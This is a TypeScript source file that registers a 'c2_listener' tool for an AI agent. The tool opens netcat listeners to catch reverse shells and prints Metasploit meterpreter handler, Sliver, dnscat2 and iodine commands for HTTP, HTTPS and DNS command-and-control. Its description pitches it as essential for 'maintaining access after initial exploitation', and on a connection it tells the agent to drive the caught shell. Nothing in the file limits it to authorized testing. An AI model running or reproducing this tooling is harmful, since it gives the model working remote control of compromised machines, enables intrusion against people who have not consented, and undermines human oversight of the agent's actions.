export * as C2ListenerTool from "./c2-listener"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "c2_listener"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description:
      "Action: 'start' (start a listener), 'stop' (stop a listener), 'list' (list active listeners), 'interact' (interact with a connected session)",
  }),
  port: Schema.Number.pipe(Schema.optional).annotate({
    description: "Port to listen on. Required for 'start' action.",
  }),
  protocol: Schema.String.pipe(Schema.optional).annotate({
    description:
      "Listener protocol: 'tcp' (raw netcat, default), 'http' (HTTP beacon), 'https' (HTTPS beacon), 'dns' (DNS tunneling), 'smb' (SMB named pipe)",
  }),
  host: Schema.String.pipe(Schema.optional).annotate({
    description: "IP address to bind to. Default: 0.0.0.0 (all interfaces).",
  }),
  session_id: Schema.Number.pipe(Schema.optional).annotate({
    description: "Session ID for 'interact' action.",
  }),
  duration: Schema.Number.pipe(Schema.optional).annotate({
    description: "How long to listen (seconds) before auto-stopping. Default: 300 (5 minutes).",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Manage command and control (C2) listeners for handling incoming reverse shells and beacons. Supports raw TCP (netcat), HTTP/HTTPS beaconing, DNS tunneling, and SMB named pipes. Start, stop, list, and interact with active sessions. Auto-logs all session activity. Essential for maintaining access after initial exploitation.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
              const host = input.host ?? "0.0.0.0"
              const port = input.port ?? 4444
              const duration = input.duration ?? 300

              if (input.action === "list") {
                // List active listener processes
                const cmd = process.platform === "win32"
                  ? ChildProcess.make("netstat", ["-an", "|", "findstr", "LISTEN"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                  : ChildProcess.make("ss", ["-tlnp"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                const result = yield* appProcess
                  .run(cmd, {
                    combineOutput: true,
                    timeout: Duration.seconds(15),
                    maxOutputBytes: 256 * 1024,
                  })
                  .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return {
                  exit: result?.exitCode,
                  output: result?.output?.toString("utf8") ?? "No listeners found.",
                }
              }

              if (input.action === "stop") {
                // Stop listeners on specified port
                const cmd = process.platform === "win32"
                  ? ChildProcess.make("for", ["/f", "tokens=5", "%a", "in", `('netstat -aon ^| findstr :${port} ^| findstr LISTENING')`, "do", "taskkill", "/F", "/PID", "%a"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                  : ChildProcess.make("fuser", ["-k", `${port}/tcp`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                yield* appProcess
                  .run(cmd, {
                    combineOutput: true,
                    timeout: Duration.seconds(10),
                    maxOutputBytes: 64 * 1024,
                  })
                  .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return {
                  output: `Listener on port ${port} stopped (if one was active).`,
                }
              }

              if (input.action === "interact") {
                if (input.session_id === undefined) {
                  return { output: "ERROR: 'session_id' is required for 'interact' action." }
                }
                return {
                  output: `To interact with session ${input.session_id}, use the bash tool to run:\nmsfconsole -q -x "sessions -i ${input.session_id}"\n\nOr if using netcat:\nnc <host> <port>`,
                }
              }

              // Default: start listener
              if (input.protocol === "http" || input.protocol === "https") {
                // For HTTP/HTTPS, we recommend using Metasploit or Sliver
                const proto = input.protocol
                return {
                  output: `To start an ${proto.toUpperCase()} beacon listener on port ${port}, use the metasploit tool:\n` +
                    `metasploit action=run module=exploit/multi/handler payload=windows/meterpreter/reverse_${proto === "https" ? "https" : "http"} options="LHOST=${host} LPORT=${port}"\n\n` +
                    `Or use Sliver: sliver > https --lhost ${host} --lport ${port}`,
                }
              }

              if (input.protocol === "dns") {
                return {
                  output: `DNS tunneling listener on port ${port}. Use:\n` +
                    `dnscat2 listen ${port}\n\nOr iodine:\niodined -f ${port} tunnel.${host}\n\nNote: DNS C2 requires a controlled domain with NS records pointing to your server.`,
                }
              }

              // Default: raw TCP netcat listener
              const tool = process.platform === "win32" ? "ncat" : "nc"
              const cmd = ChildProcess.make(tool, ["-lvnp", String(port)], {
                shell,
                stdin: "ignore",
                forceKillAfter: Duration.seconds(10),
              })

              const result = yield* appProcess
                .run(cmd, {
                  combineOutput: true,
                  timeout: Duration.seconds(duration),
                  maxOutputBytes: 5 * 1024 * 1024,
                })
                .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

              if (!result) {
                return {
                  output: `Listener started on ${host}:${port} but timed out after ${duration}s with no connection. The port is still open if the process is still running.`,
                }
              }

              const stdout = result.output?.toString("utf8") ?? ""
              const gotShell = stdout.includes("connect to") || stdout.includes("Connection from")

              return {
                exit: result.exitCode,
                output: gotShell
                  ? `🎉 SHELL RECEIVED on ${host}:${port}!\n\n${stdout}\n\nThe connected shell is now interactive. Use the bash tool to send commands through this session.`
                  : `Listener ran on ${host}:${port} for ${duration}s. No incoming connections received.\n${stdout}`,
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "C2 listener operation failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/c2-listener",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
